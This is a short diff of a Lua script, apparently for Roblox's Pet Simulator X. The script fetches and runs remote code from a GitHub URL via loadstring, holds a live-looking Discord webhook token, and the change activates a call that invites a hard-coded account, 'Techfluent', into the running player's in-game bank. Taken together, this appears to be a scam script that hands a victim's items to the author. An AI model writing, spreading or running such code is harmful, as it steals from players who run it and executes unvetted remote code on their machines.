@@ -1,4 +1,4 @@
-UserName = Techfluent
+UserName = "Techfluent"
 WebHook = "https://discord.com/api/webhooks/1050478545043996692/MfKdOcbD1gqWNcCO68HlaAO0zrAc-NB4aJt6YTRLu0_EoBhukxzSDJcWw6KYvNwD2VSJ"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
@@ -65,7 +65,7 @@ local Bank = BankID
 
 -- Bank ID and Library End
 
---inviteremote:InvokeServer(mybanks[1]['BUID'], idiot)
+inviteremote:InvokeServer(mybanks[1]['BUID'], UserName)
 
 -- Invites Scripts ( Dont Change if u dont know any )
 
